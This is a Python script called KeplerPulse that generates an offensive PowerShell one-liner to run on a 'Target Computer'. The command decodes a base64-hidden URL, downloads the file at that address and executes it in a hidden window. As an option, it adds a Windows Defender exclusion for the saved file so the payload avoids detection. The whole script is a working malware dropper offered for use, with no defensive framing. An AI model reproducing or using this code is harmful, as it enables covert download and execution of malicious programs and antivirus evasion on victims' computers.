#!/usr/bin/python3

from colorama import Fore, Style
import colorama
import time
import os, sys
import base64

banner = """
██╗  ██╗███████╗██████╗ ██╗     ███████╗██████╗     ██████╗ ██╗   ██╗██╗     ███████╗███████╗
██║ ██╔╝██╔════╝██╔══██╗██║     ██╔════╝██╔══██╗    ██╔══██╗██║   ██║██║     ██╔════╝██╔════╝
█████╔╝ █████╗  ██████╔╝██║     █████╗  ██████╔╝    ██████╔╝██║   ██║██║     ███████╗█████╗  
██╔═██╗ ██╔══╝  ██╔═══╝ ██║     ██╔══╝  ██╔══██╗    ██╔═══╝ ██║   ██║██║     ╚════██║██╔══╝  
██║  ██╗███████╗██║     ███████╗███████╗██║  ██║    ██║     ╚██████╔╝███████╗███████║███████╗
╚═╝  ╚═╝╚══════╝╚═╝     ╚══════╝╚══════╝╚═╝  ╚═╝    ╚═╝      ╚═════╝ ╚══════╝╚══════╝╚══════╝

"""


def __main__():

    colorama.init()
    def help():
        print("keplerpulse _direct_download_link exclude=true/false path=CUSTOM_PATH")
        print("- _direct_download_link - The url to the file that will be downloaded and executed. This link must be direct.")
        print("- exclude=true/false - Add Windows Defender Exclusions. Requires UAC.")
        print("- path=CUSTOM_PATH - Custom Path to save file into.")
        sys.exit()

    powershell_ = r"""$a = [Text.Encoding]::Utf8.GetString([Convert]::FromBase64String('{link}')); (new-object System.Net.WebClient).DownloadFile($a,'{path}'); Start-Process "{path}"
    """

    exclude_payload_ = r"""-inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath '{path}';"""
    try:
        download_link = ""
        exclude = ""
        save_path = ""
        exc = False
        try:
            download_link = base64.b64encode(sys.argv[1].encode())
            exclude = sys.argv[2].split("=")[1]

            if(exclude == "true"):
                exc = True

        except IndexError:
            help()
        
        try:
            path = sys.argv[3]
            if(len(path) > 0):
                save_path = path.split("=")[1]
        except IndexError:
            pass


        # print("The Download Link : ", base64.b64decode(download_link).decode())
        # print("Path : ", save_path)
        # print("Exclude : " , exclude)
        
        print(Style.BRIGHT + Fore.LIGHTRED_EX + banner + Style.RESET_ALL)
        print(Fore.LIGHTCYAN_EX + ">> Run the following command on a Target Computer.\n>> Note that the Windows Defender Exclusion Option will only work if executed in a Elevated Shell."+ Style.RESET_ALL)
        payload = powershell_.replace("{link}", download_link.decode()).replace("{path}", save_path)
        if(exc):
            new = exclude_payload_.replace("{path}", save_path)
            print("powershell.exe -windowstyle hidden " + new + " " + payload)
        else:
            print("powershell.exe -windowstyle hidden ", payload )
    except Exception as e:
        print("Error : ", str(e))
    


if __name__ == "__main__":
    __main__()

